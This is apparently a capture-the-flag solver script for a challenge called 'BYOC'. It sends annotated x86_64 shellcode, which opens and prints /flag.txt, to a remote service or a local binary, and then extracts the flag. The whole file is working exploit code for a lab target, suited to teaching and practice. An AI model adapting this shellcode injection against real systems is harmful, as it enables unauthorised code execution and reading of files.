#!/usr/bin/env python3
import argparse
import os
import re
import socket
import ssl
import subprocess
import sys

# x86_64 Linux shellcode, 72 bytes:
#   fd = open('/flag.txt', O_RDONLY)
#   n  = read(fd, rsp, 0x100)
#   write(1, rsp, n)
#   exit(0)
SHELLCODE = (
    b"\x31\xc0"                              # xor eax, eax
    b"\x50"                                  # push rax ; NULL terminator
    b"\x48\xbb\x66\x6c\x61\x67\x2e\x74\x78\x74"  # mov rbx, 'flag.txt'
    b"\x53"                                  # push rbx
    b"\x48\x83\xec\x01"                      # sub rsp, 1
    b"\xc6\x04\x24\x2f"                      # mov byte [rsp], '/'
    b"\x48\x89\xe7"                          # mov rdi, rsp
    b"\x31\xf6"                              # xor esi, esi
    b"\xb8\x02\x00\x00\x00"                  # mov eax, SYS_open
    b"\x0f\x05"                              # syscall
    b"\x48\x89\xc7"                          # mov rdi, rax
    b"\x48\x89\xe6"                          # mov rsi, rsp
    b"\xba\x00\x01\x00\x00"                  # mov edx, 0x100
    b"\x31\xc0"                              # xor eax, eax ; SYS_read
    b"\x0f\x05"                              # syscall
    b"\x89\xc2"                              # mov edx, eax
    b"\xbf\x01\x00\x00\x00"                  # mov edi, 1
    b"\xb8\x01\x00\x00\x00"                  # mov eax, SYS_write
    b"\x0f\x05"                              # syscall
    b"\xb8\x3c\x00\x00\x00"                  # mov eax, SYS_exit
    b"\x31\xff"                              # xor edi, edi
    b"\x0f\x05"                              # syscall
)


def recv_some(sock, timeout=3.0):
    sock.settimeout(timeout)
    data = b""

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break

        if not chunk:
            break

        data += chunk
        if b"}" in data:
            break

    return data


def solve_remote(host, port, use_ssl=False):
    raw = socket.create_connection((host, port), timeout=10)

    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = raw

    with sock:
        banner = recv_some(sock, timeout=0.5)
        if banner:
            print(banner.decode(errors="replace"), end="")

        print(f"[+] sending {len(SHELLCODE)} bytes shellcode")
        sock.sendall(SHELLCODE)

        out = recv_some(sock, timeout=4.0)
        print(out.decode(errors="replace"), end="")

        m = re.search(rb"[A-Za-z0-9_]+\{[^}\n]+\}", out)
        if m:
            print(f"\n<FLAG>{m.group(0).decode(errors='replace')}</FLAG>")


def solve_local(binary="./byoc"):
    if not os.path.exists(binary):
        raise FileNotFoundError(f"binary tidak ketemu: {binary}")

    p = subprocess.Popen([binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate(SHELLCODE, timeout=3)
    sys.stdout.buffer.write(out)
    sys.stderr.buffer.write(err)

    m = re.search(rb"[A-Za-z0-9_]+\{[^}\n]+\}", out)
    if m:
        print(f"\n<FLAG>{m.group(0).decode(errors='replace')}</FLAG>")


def main():
    ap = argparse.ArgumentParser(description="BYOC solver")
    ap.add_argument("host", nargs="?", help="remote host")
    ap.add_argument("port", nargs="?", type=int, help="remote port")
    ap.add_argument("--ssl", action="store_true", help="pakai TLS/SSL")
    ap.add_argument("--local", action="store_true", help="test ke ./byoc lokal")
    ap.add_argument("--bin", default="./byoc", help="path binary lokal")
    args = ap.parse_args()

    print(f"[+] shellcode size: {len(SHELLCODE)} / 200 bytes")

    if args.local:
        solve_local(args.bin)
        return

    if not args.host or not args.port:
        print(f"usage remote: python3 {sys.argv[0]} HOST PORT [--ssl]")
        print(f"usage local : python3 {sys.argv[0]} --local")
        return

    solve_remote(args.host, args.port, args.ssl)


if __name__ == "__main__":
    main()
